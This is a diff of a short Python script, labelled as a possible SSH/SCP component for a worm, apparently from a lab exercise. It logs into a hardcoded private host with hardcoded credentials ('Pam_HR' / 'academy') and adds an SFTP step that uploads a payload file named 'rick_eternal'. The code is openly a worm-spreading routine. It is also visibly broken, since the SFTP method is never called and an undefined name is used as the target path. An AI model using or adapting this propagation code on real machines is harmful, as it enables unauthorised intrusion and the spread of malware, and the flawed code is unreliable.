@@ -1,15 +1,12 @@
-
-
-
 #--Potential SSH/SCP for worm
 import paramiko
 from sys import argv
 
 PAYLOAD = "~/rick_eternal"
 
-ipaddr = argv[1]
-user_name = argv[2]
-passwd = 'academy'
+ipaddr = '10.0.2.15'#argv[1]
+user_name = 'Pam_HR'#argv[2]
+passwd = 'academy'#argv[3]
 
 #ssh client
 client = paramiko.SSHClient()
@@ -19,6 +16,6 @@ print(f"Connecting to {ipaddr} as user '{user_name}' with password '{passwd}'")
 
 #secure file transfer protocol
 sftp = client.open_sftp
-
+sftp.put(PAYLOAD, __path__)
 #client.exec_command('') For playing win media player mp4 
 
